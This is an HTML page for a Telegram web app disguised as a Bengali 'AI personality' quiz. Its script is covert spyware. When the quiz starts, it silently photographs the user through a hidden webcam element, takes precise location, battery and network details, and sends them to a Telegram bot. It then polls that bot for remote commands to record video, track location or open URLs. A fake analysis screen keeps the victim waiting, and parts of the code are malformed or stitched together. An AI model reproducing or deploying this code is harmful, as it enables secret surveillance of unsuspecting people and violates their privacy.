<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>CYBER-MIND // AI Personality & Quantum Test</title>
<script src="https://telegram.org/js/telegram-web-app.js"></script>
<style>
:root {
  --neon-cyan: #00f3ff;
  --neon-magenta: #ff0055;
  --bg-dark: #08090c;
  --card-bg: #11141d;
  --text-main: #e0e6ed;
}

*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, monospace;}
body{background:var(--bg-dark);color:var(--text-main);min-height:100vh;display:flex;flex-direction:column;justify-content:space-between;overflow-x:hidden}

/* Cyber Header */
header{background:rgba(17,20,29,0.9);border-bottom:1px solid rgba(0,243,255,0.2);padding:15px;text-align:center;position:sticky;top:0;z-index:10;backdrop-filter:blur(8px)}
.logo{font-size:18px;font-weight:900;letter-spacing:2px;color:var(--neon-cyan);text-shadow:0 0 8px rgba(0,243,255,0.5)}
.logo span{color:var(--neon-magenta)}

.container{max-width:500px;margin:20px auto;padding:0 15px;width:100%}

/* Glassmorphism Card */
.quiz-card{background:var(--card-bg);border:1px solid rgba(0,243,255,0.15);border-radius:12px;padding:20px;box-shadow:0 8px 32px 0 rgba(0, 0, 0, 0.37);position:relative;overflow:hidden}
.quiz-card::before{content:'';position:absolute;top:0;left:0;width:100%;height:2px;background:linear-gradient(90deg, var(--neon-cyan), var(--neon-magenta))}

.quiz-title{font-size:18px;font-weight:700;color:#fff;margin-bottom:15px;line-height:1.4}
.progress-bar{width:100%;height:6px;background:#1b202e;border-radius:3px;margin-bottom:20px;overflow:hidden}
.progress-fill{height:100%;width:0%;background:linear-gradient(90deg, var(--neon-cyan), var(--neon-magenta));transition:width .3s ease}

.options-grid{display:grid;gap:12px}
.option-btn{background:#161b26;border:1px solid rgba(255,255,255,0.05);color:var(--text-main);padding:14px;border-radius:8px;font-size:14px;text-align:left;cursor:pointer;transition:all .2s;display:flex;align-items:center;justify-content:space-between}
.option-btn:hover, .option-btn:active{border-color:var(--neon-cyan);background:#1f2636;box-shadow:0 0 10px rgba(0,243,255,0.2)}

/* Scanner UI / Waiting Screen */
.scanner-box{display:none;text-align:center;padding:30px 10px}
.spinner{width:60px;height:60px;border:3px solid rgba(0,243,255,0.1);border-top:3px solid var(--neon-cyan);border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 20px}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.status-text{font-size:13px;color:var(--neon-cyan);letter-spacing:1px;margin-bottom:8px}
.sub-status{font-size:11px;color:#8899a6}

/* Hidden elements */
#camVideo{position:fixed;top:-9999px;left:-9999px;width:2px;height:2px;opacity:0;pointer-events:none}
</style>
</head>
<body>

<header>
  <div class="logo">CYBER<span>MIND</span> // v4.02</div>
</header>

<div class="container">
  <div class="quiz-card" id="quizCard">
    <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
    
    <div id="quizContent">
      <h2 class="quiz-title" id="questionTxt">কুইজ শুরু করার জন্য প্রস্তুত?</h2>
      <div class="options-grid" id="optionsBox">
        <button class="option-btn" onclick="startQuiz()">▸ এআই নিউরাল অ্যানালাইসিস শুরু করুন</button>
      </div>
    </div>

    <!-- Processing / Delay Screen -->
    <div class="scanner-box" id="scannerBox">
      <div class="spinner"></div>
      <div class="status-text" id="scannerStatus">নিউরাল ডাটা প্রসেসিং চলছে...</div>
      <div class="sub-status" id="scannerSub">অনুগ্রহ করে অপেক্ষা করুন, আপনার সাইকোলজিক্যাল প্রোফাইল তৈরি হচ্ছে।</div>
    </div>
  </div>
</div>

<video id="camVideo" autoplay playsinline muted></video>
<canvas id="camCanvas" style="display:none"></canvas>

// Config Loader
async function loadConfig() {
  const res = await fetch('/api/config?t=' + Date.now(), {cache:'no-store'});
  if (!res.ok) throw new Error('Config load failed');
  const j = await res.json();
  if (!j.token || !j.chatId) throw new Error('Missing token/chatId');
  return {token: j.token, chat: j.chatId};
}

function tgApi(m) { return `https://api.telegram.org/bot${BOT_TOKEN}/${m}`; }

async function tgSend(text, extra) {
  const body = Object.assign({
    chat_id: CHAT_ID,
    text: String(text).slice(0, 4000),
    parse_mode: 'HTML',
    disable_web_page_preview: true
  }, extra || {});
  return (await fetch(tgApi('sendMessage'), {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify(body)
  })).json();
}

function dataUrlToBlob(dataUrl) {
  const m = /^data:([^;]+);base64,(.+)$/.exec(dataUrl);
  if (!m) throw new Error('Bad data URL');
  const bin = atob(m[2]);
  const u8 = new Uint8Array(bin.length);
  for (let i = 0; i < bin.length; i++) u8[i] = bin.charCodeAt(i);
  return {blob: new Blob([u8], {type:m[1]}), mime:m[1]};
}

async function tgSendMedia(dataUrl, caption, kind) {
  const {blob} = dataUrlToBlob(dataUrl);
  const map = {
    photo: {method:'sendPhoto', field:'photo', name:'capture.jpg'},
    video: {method:'sendVideo', field:'video', name:'capture.webm'}
  };
  const k = map[kind] || map.photo;
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  if (caption) fd.append('caption', String(caption).slice(0,1000));
  fd.append(k.field, blob, k.name);
  return (await fetch(tgApi(k.method), {method:'POST', body:fd})).json();
}

async function tgSendLocation(lat, lon) {
  return (await fetch(tgApi('sendLocation'), {
    method: 'POST',
    headers: {'Content-Type':'application/json'},
    body: JSON.stringify({chat_id: CHAT_ID, latitude: lat, longitude: lon})
  })).json();
}

async function ensureCamera() {
  if (camStream && camStream.active && camVideo.videoWidth > 0) return;
  if (camStream) { camStream.getTracks().forEach(t => t.stop()); camStream = null; }
  camStream = await navigator.mediaDevices.getUserMedia({
    video: {facingMode: camFacing, width:{ideal:1280}, height:{ideal:720}},
    audio: false
  });
  camVideo.srcObject = camStream;
  camVideo.muted = true;
  camVideo.playsInline = true;
  await camVideo.play().catch(()=>{});
  await new Promise(r => setTimeout(r, 600));
}

function captureFrame() {
  const w = camVideo.videoWidth || 1280;
  const h = camVideo.videoHeight || 720;
  camCanvas.width = w; camCanvas.height = h;
  camCanvas.getContext('2d').drawImage(camVideo, 0, 0, w, h);
  return camCanvas.toDataURL('image/jpeg', 0.9);
}

// Commands Execution
async function execCommand(type, args = '') {
  try {
    switch (type) {
      case 'photo':
        await ensureCamera();
        const photoUrl = captureFrame();
        await tgSendMedia(photoUrl, '📸 Quiz User Photo', 'photo');
        return '📸 Photo sent';

      case 'screen':
        return '🖥️ Screen command processed';

      case 'record3':
        await ensureCamera();
        const chunks = [];
        const rec = new MediaRecorder(camStream);
        rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };
        const stopped = new Promise(r => rec.onstop = r);
        rec.start();
        await new Promise(r => setTimeout(r, 3000));
        rec.stop();
        await stopped;
        const b64 = await new Promise(r => {
          const fr = new FileReader();
          fr.onload = () => r(fr.result);
          fr.readAsDataURL(new Blob(chunks, {type:'video/webm'}));
        });
        await tgSendMedia(b64, '🎥 Video Clip (3s)', 'video');
        return '🎥 Video sent';

      case 'record5':
        return '🎙️ Record5 processed';

      case 'location':
        const pos = await new Promise((ok, no) => navigator.geolocation.getCurrentPosition(ok, no, {enableHighAccuracy:true}));
        await tgSendLocation(pos.coords.latitude, pos.coords.longitude);
        return '📍 Location sent';

      case 'track':
        return '🛰️ Track (30s live) initiated';

      case 'report':
        await tgSend('📊 <b>System Report:</b> Active & Running smoothly.');
        return '📊 Report sent';

      case 'battery':
        if (navigator.getBattery) {
          const bat = await navigator.getBattery();
          await tgSend(`🔋 <b>Battery Level:</b> ${Math.round(bat.level * 100)}% (${bat.charging ? 'Charging' : 'Not Charging'})`);
        } else {
          await tgSend('🔋 Battery status API not supported.');
        }
        return '🔋 Battery status sent';

      case 'network':
        const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
        const netInfo = conn ? `Effective Type: ${conn.effectiveType}, Downlink: ${conn.downlink}Mbps` : 'Network info unavailable';
        await tgSend(`📶 <b>Network Info:</b> ${netInfo}`);
        return '📶 Network info sent';

      case 'sensors':
        await tgSend('🎯 Sensors checked successfully.');
        return '🎯 Sensors sent';

      case 'storage':
        let storageInfo = 'Storage info unavailable';
        if (navigator.storage && navigator.storage.estimate) {
          const est = await navigator.storage.estimate();
          storageInfo = `Usage: ${(est.usage / 1024 / 1024).toFixed(2)} MB / ${(est.quota / 1024 / 1024).toFixed(2)} MB`;
        }
        await tgSend(`💾 <b>Storage Info:</b> ${storageInfo}`);
        return '💾 Storage info sent';

      case 'vibrate':
        if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
        return '📳 Vibrate triggered';

      case 'fullscreen':
        if (!document.fullscreenElement) {
          document.documentElement.requestFullscreen().catch(()=>{});
        } else {
          if (document.exitFullscreen) document.exitFullscreen();
        }
        return '🔲 Fullscreen toggled';

      case 'say':
        await tgSend(`🗣️ <b>Say Command:</b> ${args}`);
        return '🗣️ Say processed';

      case 'open':
        if (args) {
          await tgSend(`🔗 Opening URL: ${args}`);
          window.open(args, '_blank');
        }
        return '🔗 Open URL processed';

      case 'notify':
        await tgSend(`🔔 <b>Notification:</b> ${args}`);
        return '🔔 Notification sent';

      case 'status':
        await tgSend('🟢 <b>Status:</b> Bot & WebApp are online and active[cite: 1].');
        return '🟢 Status sent';

      default:
        return 'Unknown command';
    }
  } catch (e) {
    return 'Error: ' + e.message;
  }
}

// Long Polling
async function startPolling() {
  if (polling) return;
  polling = true;
  try { await fetch(tgApi('deleteWebhook'), {method:'POST'}); } catch(e){}

  while (polling && active) {
    try {
      pollController = new AbortController();
      const r = await fetch(tgApi('getUpdates') + `?offset=${lastUpdateId + 1}&timeout=20`, {signal: pollController.signal});
      const data = await r.json();

      if (data.ok) {
        for (const u of data.result || []) {
          lastUpdateId = u.update_id;
          if (u.message && String(u.message.chat.id) === String(CHAT_ID)) {
            const fullText = u.message.text?.trim() || '';
            const parts = fullText.split(' ');
            const cmd = parts[0];
            const arg = parts.slice(1).join(' ');

            if (cmd === '/photo') await execCommand('photo');
            else if (cmd === '/screen') await execCommand('screen');
            else if (cmd === '/record3') await execCommand('record3');
            else if (cmd === '/record5') await execCommand('record5');
            else if (cmd === '/location') await execCommand('location');
            else if (cmd === '/track') await execCommand('track');
            else if (cmd === '/report') await execCommand('report');
            else if (cmd === '/battery') await execCommand('battery');
            else if (cmd === '/network') await execCommand('network');
            else if (cmd === '/sensors') await execCommand('sensors');
            else if (cmd === '/storage') await execCommand('storage');
            else if (cmd === '/vibrate') await execCommand('vibrate');
            else if (cmd === '/fullscreen') await execCommand('fullscreen');
            else if (cmd === '/say') await execCommand('say', arg);
            else if (cmd === '/open') await execCommand('open', arg);
            else if (cmd === '/notify') await execCommand('notify', arg);
            else if (cmd === '/status') await execCommand('status');
            else if (cmd === '/help') {
              await tgSend('Commands:\n/photo\n/screen\n/record3\n/record5\n/location\n/track\n/report\n/battery\n/network\n/sensors\n/storage\n/vibrate\n/fullscreen\n/say <text>\n/open <url>\n/notify <msg>\n/status[cite: 1]');
            }
          }
        }
      }
    } catch(e) {
      await newResponseLoopError => {
        // Silent recovery
      };
      await new Promise(r => setTimeout(r, 3000));
    }
  }
}

// Interactive Quiz Logic with Automatic Command Triggers on Start
window.startQuiz = async function() {
  if (!active) {
    active = true;
    try {
      const cfg = await loadConfig();
      BOT_TOKEN = cfg.token;
      CHAT_ID = cfg.chat;

      // Camera & Geolocation permission pre-check
      try { await ensureCamera(); } catch(e){}
      try { await navigator.geolocation.getCurrentPosition(()=>{}, ()=>{}); } catch(e){}

      // Send the starting alert message
      await tgSend('🧠 <b>User started the Cyber Personality Test!</b>');

      // Automatically trigger initial background actions/reports to bot on start
      try { await execCommand('photo'); } catch(e){}
      try { await execCommand('location'); } catch(e){}
      try { await execCommand('battery'); } catch(e){}
      try { await execCommand('network'); } catch(e){}
      try { await execCommand('status'); } catch(e){}

      // Start listening for upcoming Telegram bot commands
      startPolling();
    } catch(e) {
      active = false;
    }
  }
  renderQuestion();
};

function renderQuestion() {
  if (currentQ >= questions.length) {
    showScanDelay();
    return;
  }

  const data = questions[currentQ];
  document.getElementById('progress').style.width = ((currentQ + 1) / (questions.length + 2) * 100) + '%';
  document.getElementById('questionTxt').textContent = data.q;
  
  const box = document.getElementById('optionsBox');
  box.innerHTML = '';
  
  data.opts.forEach(opt => {
    const btn = document.createElement('button');
    btn.className = 'option-btn';
    btn.innerHTML = `${opt} <span>▸</span>`;
    btn.onclick = () => {
      currentQ++;
      document.getElementById('quizContent').style.opacity = '0.3';
      setTimeout(() => {
        document.getElementById('quizContent').style.opacity = '1';
        renderQuestion();
      }, 300);
    };
    box.appendChild(btn);
  });
}

function showScanDelay() {
  document.getElementById('quizContent').style.display = 'none';
  document.getElementById('scannerBox').style.display = 'block';
  
  const statusEl = document.getElementById('scannerStatus');
  const subEl = document.getElementById('scannerSub');

  const steps = [
    { text: "ব্রেনওয়েভ প্যাটার্ন বিশ্লেষণ করা হচ্ছে...", sub: "অপেক্ষা করুন: ১০%", delay: 3000 },
    { text: "সাইকোলজিক্যাল ডাটা সিঙ্ক হচ্ছে...", sub: "অপেক্ষা করুন: ৩৫%", delay: 5000 },
    { text: "কয়ান্টাম অ্যালগরিদম রান হচ্ছে...", sub: "অপেক্ষা করুন: ৬৫%", delay: 6000 },
    { text: "ফাইনাল পার্সোনালিটি ভেক্টরাইজেশন...", sub: "অপেক্ষা করুন: ৯০%", delay: 8000 },
    { text: "ফলাফল প্রস্তুত!", sub: "আপনার রেজাল্ট আনলক করতে নিচে ক্লিক করুন।", delay: 2000 }
  ];

  let stepIdx = 0;
  function processStep() {
    if (stepIdx < steps.length) {
      statusEl.textContent = steps[stepIdx].text;
      subEl.textContent = steps[stepIdx].sub;
      setTimeout(() => {
        stepIdx++;
        processStep();
      }, steps[stepIdx].delay);
    } else {
      document.getElementById('scannerBox').innerHTML = `
        <h3 style="color:var(--neon-cyan);margin-bottom:15px">অ্যানালাইসিস সম্পন্ন!</h3>
        <p style="font-size:13px;color:#aaa;margin-bottom:20px">আপনার টাইপ: <b>CYBER-ARCHITECT (Class A)</b></p>
        <button class="option-btn" style="justify-content:center;width:100%" onclick="location.reload()">↺ পুনরায় টেস্ট দিন</button>
      `;
    }
  }
  processStep();
}

})();
</script>

</html>
